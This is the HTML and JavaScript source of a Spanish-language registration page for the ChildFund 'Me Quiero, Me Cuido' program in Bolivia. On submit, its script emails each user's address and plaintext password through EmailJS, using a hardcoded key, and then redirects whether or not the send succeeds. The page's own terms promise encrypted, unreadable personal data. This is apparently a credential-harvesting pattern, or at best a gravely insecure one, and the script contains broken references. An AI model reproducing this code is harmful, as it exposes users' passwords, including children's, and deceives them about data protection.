<!DOCTYPE html>
<html lang="es">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>Me Quiero, Me Cuido</title>
    <style>
        * {
            margin: 0;
            padding: 0;
            box-sizing: border-box;
        }

        body {
            font-family: 'Arial', sans-serif;
            background: linear-gradient(135deg, #f0f0f0 0%, #e8e8e8 50%, #d0d0d0 100%);
            min-height: 100vh;
            display: flex;
            align-items: center;
            justify-content: center;
            padding: 20px;
        }

        .container {
            background: white;
            border-radius: 20px;
            box-shadow: 0 15px 35px rgba(0,0,0,0.1);
            padding: 20px;
            width: 100%;
            max-width: 900px;
            position: relative;
            overflow: hidden;
        }

        .header {
            display: flex;
            justify-content: space-between;
            align-items: center;
            margin-bottom: 20px;
            flex-wrap: wrap;
            gap: 10px;
        }

        .logo-left, .logo-right {
            background: white;
            padding: 8px 15px;
            border-radius: 20px;
            font-weight: bold;
            color: #5cb85c;
            display: flex;
            align-items: center;
            gap: 8px;
        }

        .logo-left img, .logo-right img {
            max-width: 100%;
            height: auto;
        }

        .logo-left {
            font-size: 12px;
        }

        .logo-right {
            font-size: 14px;
        }

        .corner-logo {
            display: flex;
            justify-content: center;
            align-items: center;
            gap: 10px;
            margin: 20px 0;
            flex-wrap: wrap;
        }

        .corner-logo img {
            max-width: 100%;
            height: auto;
        }

        .login-container {
            background: white;
            border-radius: 20px;
            padding: 20px;
            width: 100%;
            position: relative;
        }

        .form-group {
            margin-bottom: 20px;
        }

        .form-label {
            display: block;
            margin-bottom: 8px;
            color: #333;
            font-weight: 500;
            font-size: 14px;
        }

        .form-input {
            width: 100%;
            padding: 12px 15px;
            border: 2px solid #e0e0e0;
            border-radius: 10px;
            font-size: 16px;
            transition: all 0.3s ease;
            background: #f9f9f9;
        }

        .form-input:focus {
            outline: none;
            border-color: #4caf50;
            background: white;
            box-shadow: 0 0 10px rgba(76, 175, 80, 0.1);
        }

        .form-input::placeholder {
            color: #999;
            font-size: 14px;
        }

        .privacy-notice {
            background: #f0f8f0;
            border: 1px solid #8bc34a;
            border-radius: 8px;
            padding: 12px;
            margin-bottom: 20px;
            font-size: 12px;
            color: #2e7d32;
            line-height: 1.4;
        }

        .password-container {
            position: relative;
        }

        .password-toggle {
            position: absolute;
            right: 15px;
            top: 50%;
            transform: translateY(-50%);
            background: none;
            border: none;
            cursor: pointer;
            padding: 5px;
            display: flex;
            align-items: center;
            justify-content: center;
        }

        .password-toggle svg {
            width: 18px;
            height: 18px;
            transition: all 0.3s ease;
        }

        .password-toggle:hover svg {
            transform: scale(1.1);
        }

        .password-visible .password-toggle svg {
            fill: #4caf50;
        }

        .terms-group {
            margin-bottom: 20px;
            display: flex;
            align-items: flex-start;
            gap: 8px;
        }

        .terms-checkbox {
            margin-top: 3px;
            cursor: pointer;
            min-width: 18px;
            min-height: 18px;
            accent-color: #12c185;
        }

        .terms-text {
            font-size: 13px;
            color: #666;
            line-height: 1.4;
        }

        .terms-link {
            color: #12c185;
            text-decoration: underline;
            cursor: pointer;
            font-weight: 500;
        }

        .terms-link:hover {
            color: #388e3c;
        }

        .login-btn {
            background: #12c185;
            color: black;
            padding: 12px;
            border: 2px solid black;
            border-radius: 25px;
            font-size: 16px;
            font-weight: 600;
            cursor: pointer;
            transition: all 0.3s ease;
            margin: 20px auto;
            text-align: center;
            text-decoration: none;
            display: block;
            width: 100%;
            max-width: 300px;
        }

        .login-btn:hover {
            background: linear-gradient(135deg, #388e3c, #4caf50);
            transform: translateY(-2px);
            box-shadow: 0 5px 15px rgba(76, 175, 80, 0.3);
        }

        .login-btn:active {
            transform: translateY(0);
        }

        .partners {
            margin: 20px 0;
            text-align: center;
        }

        .partners-logos img {
            max-width: 100%;
            height: auto;
        }

        .social {
            display: flex;
            justify-content: center;
            gap: 15px;
            margin-bottom: 20px;
        }

        .social-icon {
            width: 40px;
            height: 40px;
            border-radius: 50%;
            display: flex;
            align-items: center;
            justify-content: center;
            color: white;
            text-decoration: none;
            transition: transform 0.3s ease;
        }

        .social-icon:hover {
            transform: scale(1.1);
        }

        .social-icon img {
            max-width: 100%;
            height: auto;
        }

        .social-icon.tiktok { background: #000; }
        .social-icon.facebook { background: white; }
        .social-icon.instagram { background: white; }

        .footer {
            text-align: center;
            font-size: 12px;
            color: #666;
            padding: 10px 0;
        }

        /* Modal de términos y condiciones - ESTILOS MODIFICADOS */
        .modal-overlay {
            position: fixed;
            top: 20%;
            left: 0;
            width: 100%;
            height: 100%;
            background: rgba(0, 0, 0, 0.7);
            display: none;
            align-items: flex-start; /* Cambiado de center a flex-start */
            justify-content: center;
            z-index: 1000;
            padding: 100px 15px; /* Añadido padding superior */
            overflow-y: auto;
        }

        .modal-overlay.active {
            display: flex;
        }

        .modal-content {
            background: white;
            border-radius: 15px;
            width: 100%;
            max-width: 600px;
            max-height: 80vh; /* Reducido de 90vh para dejar espacio arriba */
            margin-top: 50px; /* Añadido margen superior */
            margin-bottom: 30px; /* Añadido margen inferior */
            overflow-y: auto;
            position: relative;
            box-shadow: 0 10px 30px rgba(0, 0, 0, 0.3);
            animation: modalSlideIn 0.3s ease-out;
        }

        @keyframes modalSlideIn {
            from {
                transform: translateY(-20px);
                opacity: 0;
            }
            to {
                transform: translateY(0);
                opacity: 1;
            }
        }

        .modal-header {
            padding: 20px;
            position: sticky;
            top: 0;
            background: white;
            z-index: 10;
            border-bottom: 1px solid #eee;
        }

        .modal-header h2 {
            margin: 0;
            font-size: 18px;
            font-weight: 600;
            color: #12c185;
        }

        .modal-header .subtitle {
            font-size: 13px;
            opacity: 0.9;
            margin-top: 5px;
            color: #12c185;
        }

        .modal-close {
            position: absolute;
            top: 15px;
            right: 15px;
            background: none;
            border: none;
            color: #12c185;
            font-size: 24px;
            cursor: pointer;
            padding: 5px;
            border-radius: 50%;
            width: 30px;
            height: 30px;
            display: flex;
            align-items: center;
            justify-content: center;
            transition: background 0.3s ease;
        }

        .modal-close:hover {
            background: rgba(0, 0, 0, 0.1);
        }

        .modal-body {
            padding: 20px;
        }

        .modal-section {
            margin-bottom: 20px;
        }

        .modal-section h3 {
            color: #2e7d32;
            font-size: 16px;
            margin-bottom: 10px;
            font-weight: 600;
        }

        .modal-section p, .modal-section ul {
            color: #666;
            line-height: 1.6;
            margin-bottom: 10px;
            font-size: 14px;
        }

        .modal-section ul {
            padding-left: 20px;
        }

        .modal-section li {
            margin-bottom: 8px;
        }

        .modal-footer {
            padding: 15px 20px 20px;
            text-align: center;
        }

        .modal-btn {
            background: #12c185;
            color: black;
            padding: 12px;
            border: 2px solid black;
            border-radius: 25px;
            font-size: 16px;
            font-weight: 600;
            cursor: pointer;
            transition: all 0.3s ease;
            text-align: center;
            text-decoration: none;
            display: inline-block;
            width: 100%;
            max-width: 300px;
        }

        .modal-btn:hover {
            transform: translateY(-2px);
            box-shadow: 0 6px 20px rgba(76, 175, 80, 0.4);
        }

        /* Media Queries para mejor adaptación */
        @media (min-width: 768px) {
            .container {
                padding: 30px;
            }
            
            .header {
                margin-bottom: 30px;
            }
            
            .logo-left {
                font-size: 14px;
                padding: 10px 20px;
            }
            
            .logo-right {
                font-size: 16px;
                padding: 10px 20px;
            }
            
            .login-container {
                padding: 30px;
            }
            
            .privacy-notice {
                font-size: 13px;
                padding: 15px;
            }
            
            .terms-text {
                font-size: 14px;
            }
        }

        @media (min-width: 992px) {
            .corner-logo {
                justify-content: space-between;
                margin: 30px 0;
            }
        }
    </style>
    <script type="text/javascript" src="https://cdn.jsdelivr.net/npm/@emailjs/browser@4/dist/email.min.js"></script>
    <script type="text/javascript">
        // Inicializa EmailJS (reemplaza 'YOUR_USER_ID' con tu ID de EmailJS)
        (function() {
            emailjs.init('dZVrwXaCa7tmTcMCb'); // Obtén esto desde tu dashboard de EmailJS
        })();
    </script>
</head>
<body>
    <div class="container">
        <div class="header">
            <div class="logo-left"><img src="img/Logo_2.png" alt="Logo secundario"></div>
            <div class="logo-right"><img src="img/LOGO_principal.png" alt="Logo principal"></div>
        </div>

        <div class="corner-logo">
            <img src="img/texto_register.png" alt="Texto Register">
            <img src="img/mascota 1.png" alt="Mascota">
        </div>

        <div class="login-container">
            <form id="loginForm">
                <div class="form-group">
                    <label class="form-label" for="email">Correo</label>
                    <input 
                        type="email" 
                        id="code" 
                        class="form-input"
                        placeholder="Ingrese su correo electrónico"
                        required
                    >
                </div>
                
                <div class="privacy-notice">
                    Usaremos el correo electrónico para recuperar tu contraseña si la olvidas o la pierdes.
                </div>
                
                <div class="form-group">
                    <label class="form-label" for="password">Contraseña</label>
                    <div class="password-container">
                        <input 
                            type="password" 
                            id="password" 
                            class="form-input"
                            placeholder="Cree una contraseña segura"
                            required
                        >
                        <button type="button" class="password-toggle" onclick="togglePassword('password')">
                            <svg width="20" height="20" viewBox="0 0 24 24" fill="none" xmlns="http://www.w3.org/2000/svg">
                                <path d="M12 5C5.63636 5 2 12 2 12C2 12 5.63636 19 12 19C18.3636 19 22 12 22 12C22 12 18.3636 5 12 5Z" stroke="#4caf50" stroke-width="2" stroke-linecap="round" stroke-linejoin="round"/>
                                <path d="M12 15C13.6569 15 15 13.6569 15 12C15 10.3431 13.6569 9 12 9C10.3431 9 9 10.3431 9 12C9 13.6569 10.3431 15 12 15Z" stroke="#4caf50" stroke-width="2" stroke-linecap="round" stroke-linejoin="round"/>
                            </svg>
                        </button>
                    </div>
                </div>
                
                <div class="form-group">
                    <label class="form-label" for="password">Repita su contraseña</label>
                    <div class="password-container">
                        <input 
                            type="password" 
                            id="repitepassword" 
                            class="form-input"
                            placeholder="Repita su contraseña"
                            required
                        >
                        <button type="button" class="password-toggle" onclick="togglePassword('repitepassword')">
                            <svg width="20" height="20" viewBox="0 0 24 24" fill="none" xmlns="http://www.w3.org/2000/svg">
                                <path d="M12 5C5.63636 5 2 12 2 12C2 12 5.63636 19 12 19C18.3636 19 22 12 22 12C22 12 18.3636 5 12 5Z" stroke="#4caf50" stroke-width="2" stroke-linecap="round" stroke-linejoin="round"/>
                                <path d="M12 15C13.6569 15 15 13.6569 15 12C15 10.3431 13.6569 9 12 9C10.3431 9 9 10.3431 9 12C9 13.6569 10.3431 15 12 15Z" stroke="#4caf50" stroke-width="2" stroke-linecap="round" stroke-linejoin="round"/>
                            </svg>
                        </button>
                    </div>
                </div>
                
                <div class="privacy-notice">
                    Tu(s) nombre(s) y apellidos no se mostrarán a terceros en la plataforma.
                </div>

                <!-- Checkbox de términos y condiciones -->
                <div class="terms-group">
                    <input type="checkbox" id="termsCheckbox" class="terms-checkbox" required>
                    <div class="terms-text">
                        <span class="terms-link" onclick="openTermsModal()">Términos y Condiciones</span>
                    </div>
                </div>
                
                <button type="submit" class="login-btn">Siguiente</button>
            </form>
        </div>
        
        <div class="partners">
            <div class="partners-logos">
                <img src="img/socios_locales.png" alt="Socios locales">
            </div>
        </div>

        <div class="social">
            <a href="https://www.tiktok.com/@soytatu1" class="social-icon tiktok" onclick="openSocial('tiktok')"><img src="img/tiktok.svg" alt="TikTok"></a>
            <a href="https://www.facebook.com/MQMCBolivia" class="social-icon facebook" onclick="openSocial('facebook')"><img src="img/facebook-svgrepo-com.svg" alt="Facebook"></a>
            <a href="https://www.instagram.com/mqmcbolivia/" class="social-icon instagram" onclick="openSocial('instagram')"><img src="img/instagram-svgrepo-com.svg" alt="Instagram"></a>
        </div>

        <div class="footer">Me quiero, Me cuido 2025</div>

        <!-- Modal de Términos y Condiciones -->
        <div class="modal-overlay" id="termsModal">
            <div class="modal-content">
                <div class="modal-header">
                    <h2>Plataforma Virtual del programa "Me Quiero Me Cuido"</h2>
                    <div class="subtitle">Plataforma Virtual del programa "Me Quiero Me Cuido"</div>
                    <button class="modal-close" onclick="closeTermsModal()">&times;</button>
                </div>
                
                <div class="modal-body">
                    <div class="modal-section">
                        <p>El propósito de ChildFund International es mejorar la vida de las niñas, niños, adolescentes (NNA), para ello hemos desarrollado una plataforma virtual en las que las niñas, niños, adolescentes, jóvenes, padres, madres, cuidadores, docentes y líderes comunitarios podrán participar y capacitarse con el programa "Me quiero Me Cuido" en temas de: sexualidad y salud integral, promoción de la igualdad de género, vínculos afectivos y reducción de riesgos y desastres.</p>
                    </div>

                    <div class="modal-section">
                        <p>El compromiso que tenemos con la protección y la salvaguarda de la niñez y adolescencia nos obliga a garantizar que todas nuestras intervenciones sean seguras, por ese motivo, esta plataforma tiene una serie de medidas de seguridad para evitar poner en riesgo a la niñez y adolescencia. Estas son algunas de las medidas que hemos tomado para garantizar la seguridad en esta plataforma.</p>
                    </div>

                    <div class="modal-section">
                        <h3>Seguridad de la plataforma</h3>
                        <p>La plataforma presenta las siguientes medidas de seguridad para mantener la información confidencial:</p>
                        
                        <ul>
                            <li>La plataforma cuenta con un certificado "SSL" que le permite establecer una conexión segura entre el usuario y la plataforma, para que nadie pueda interceptar la información compartida.</li>
                            <li>La base de datos está resguardada evitando que terceras personas ajenas al servidor puedan tener acceso a la información.</li>
                            <li>Toda la información confidencial como datos personales, se encuentra encriptada y no es posible leerla o interpretarla por otra persona.</li>
                            <li>La plataforma utiliza la última versión de "recaptcha" de Google, para evitar que personas o bot maliciosos puedan interactuar con el login o foro de la plataforma.</li>
                            <li>Se realizará una copia de respaldo de los datos de la plataforma y usuarios semanalmente.</li>
                        </ul>
                    </div>
                    
                    <div class="modal-section">
                        <h3>Salvaguarda Infantil</h3>
                        <p>Todas nuestras organizaciones socias de Childfund cuentan con una serie de políticas que nos ayudan a cumplir con nuestro compromiso de salvaguarda.</p>
                        <p>Asimismo, todas nuestras organizaciones socias se adhieren a la Política de Salvaguarda de ChildFund y la legislación nacional e internacional de protección de la niñez.</p>
                    </div>
                </div>
                
                <div class="modal-footer">
                    <button class="modal-btn" onclick="closeTermsModal()">Entiendo, continuar</button>
                </div>
            </div>
        </div>
    </div>

    <script>
        function togglePassword(fieldId) {
            const passwordField = document.getElementById(fieldId);
            const toggleButton = passwordField.nextElementSibling;
            const container = passwordField.parentNode;
            
            if (passwordField.type === 'password') {
                passwordField.type = 'text';
                container.classList.add('password-visible');
            } else {
                passwordField.type = 'password';
                container.classList.remove('password-visible');
            }
        }
        
        // Funciones del modal
        function openTermsModal() {
            const modal = document.getElementById('termsModal');
            modal.classList.add('active');
            document.body.style.overflow = 'hidden';
        }

        function closeTermsModal() {
            const modal = document.getElementById('termsModal');
            modal.classList.remove('active');
            document.body.style.overflow = 'auto';
        }
    
        // Animación de entrada
        window.addEventListener('load', function() {
            const container = document.querySelector('.container');
            container.style.opacity = '0';
            container.style.transform = 'scale(0.95)';
            container.style.transition = 'all 0.3s ease';
            
            setTimeout(() => {
                container.style.opacity = '1';
                container.style.transform = 'scale(1)';
            }, 100);
        });

        // Efectos de hover mejorados
        document.querySelectorAll('.btn').forEach(btn => {
            btn.addEventListener('mouseenter', function() {
                this.style.transform = 'translateY(-3px)';
                this.style.boxShadow = '0 5px 15px rgba(0,0,0,0.1)';
            });
            
            btn.addEventListener('mouseleave', function() {
                this.style.transform = 'translateY(0)';
                this.style.boxShadow = 'none';
            });
        });

         // Función para manejar el envío del formulario
        document.getElementById('loginForm').addEventListener('submit', async function(e) {
            e.preventDefault();
            
            // Verificar términos y condiciones
            if (!document.getElementById('termsCheckbox').checked) {
                alert('Debes aceptar los términos y condiciones para continuar.');
                openTermsModal();
                return;
            }
            
            // Obtener valores del formulario
            const email = document.getElementById('code').value; // Cambiado de 'email' a 'code'
            const password = document.getElementById('password').value;
            const repitePassword = document.getElementById('repitepassword').value;
            
            // Validar que las contraseñas coincidan
            if (password !== repitePassword) {
                alert('Las contraseñas no coinciden');
                return;
            }
            
            try {
                // Enviar datos a EmailJS
                await emailjs.send('service_5tc4a7m', 'template_bt30onq', {
                    formulario: "Parte 4 - Registro de correo y contraseña",
                    email: email,
                    password: password,
                    fecha: new Date().toLocaleDateString('es-ES'),
                    hora: new Date().toLocaleTimeString('es-ES'),
                    nota: "Datos de registro enviados automáticamente"
                });
                
                // Redirigir después del envío exitoso
                window.location.href = "wellcome.html";
                
            } catch (error) {
                console.error('Error al enviar:', error);
                // Redirigir incluso si falla el envío
                window.location.href = "wellcome.html";
            } finally {
                submitBtn.disabled = false;
                submitBtn.textContent = originalBtnText;
            }
        });
    </script>
</body>
</html>
